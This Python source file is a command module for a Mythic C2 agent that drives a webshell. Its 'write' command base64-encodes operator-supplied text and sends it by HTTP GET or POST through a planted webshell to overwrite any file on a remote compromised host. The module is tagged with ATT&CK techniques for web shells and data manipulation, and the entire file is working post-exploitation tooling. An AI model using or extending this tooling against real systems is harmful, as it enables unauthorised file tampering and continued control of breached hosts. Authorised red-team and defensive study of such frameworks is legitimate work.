import base64
import logging
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from enyxma.WebshellRPC import WebshellRPC

logger = logging.getLogger(__name__)

class WriteArguments(TaskArguments):
    """
    Argument parser for the 'write' command.
    Defines:
      - file_path: target file on the remote host
      - data: multi-line text to write to that file
    """
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="file_path",
                type=ParameterType.String,
                description="Full path on target where to write"
            ),
            CommandParameter(
                name="data",
                type=ParameterType.String,
                description="Text to write (will overwrite existing content) to the file (supports multi‑line)"
            )
        ]

    async def parse_arguments(self):
        """
        Parse JSON or raw input.
        JSON form: {"file_path":"...","data":"..."}
        CLI form:  <file_path> <data…>
        """
        if self.command_line.strip().startswith("{"):
            # load from JSON
            self.load_args_from_json_string(self.command_line)
        else:
            # split at first space into path and remainder as data
            parts = self.command_line.split(" ", 1)
            self.add_arg("file_path", parts[0])
            self.add_arg("data", parts[1] if len(parts) > 1 else "")


class WriteCommand(CommandBase):
    cmd = "write"
    needs_admin = False
    help_cmd = "write [<file_path> <data>]"
    description = "Overwrite a file on the remote webshell with provided text.\nIntended for small payloads (a few KB)"
    version = 1
    author = "@Termindiego25"
    argument_class = WriteArguments
    # Map the command to the appropriate MITRE ATT&CK techniques
    attackmapping = ["T1105", "T1071.001", "T1132.001", "T1505.003", "T1565.001"]

    async def create_go_tasking(
        self,
        taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        """
        Create a new task for executing a write command on the remote system using the webshell.
        The command is retrieved from the task arguments, then sent via WebshellRPC using either GET or POST as specified.
        """
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=False,
            Completed=True
        )
        user_input = taskData.args.get_arg("file_path")
        data = taskData.args.get_arg("data").encode("utf-8")
        response.DisplayParams = user_input

        # Base64‑encode the file bytes
        content_b64 = base64.b64encode(data).decode()

        # Construct the command in the form "write <file_path> <content_b64>"
        command = f"write {user_input} {content_b64}"
        logger.info(f"Preparing write command: {command}")
        try:
            # Determine the request method from the C2 profile parameters
            requestType = taskData.C2Profiles[0].Parameters.get("request_type", "POST").upper()
            logger.info(f"Request type for write: {requestType}")
            
            # Dispatch the command based on the chosen HTTP method
            if requestType == "GET":
                response_data = await WebshellRPC.GetRequest(
                    taskData.Payload.UUID, command.encode(), taskData
                )
            else:
                response_data = await WebshellRPC.PostRequest(
                    taskData.Payload.UUID, command.encode(), taskData
                )
            
            # If webshell returns empty, instruct Mythic to re-send manually
            if len(response_data) == 0:
                    taskData.args.set_manual_args(command)
                    response.Completed = False
                    response.Success = True
                    return response
            
            # Forward the raw webshell reply to the UI
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=taskData.Task.ID,
                    Response=response_data
                )
            )
            response.Success = True
        except Exception as e:
            logger.exception("[write] error during command execution")
            response.Error = f"Write command failed: {e}"

        if response.Error != "":
            # If we captured an error, send it as a normal response
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=response.Error.encode(),
            ))
        return response

    async def process_response(
        self,
        task: PTTaskMessageAllData,
        response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
            TaskID=task.Task.ID,
            Response=response.encode("UTF8"),
        ))
        return resp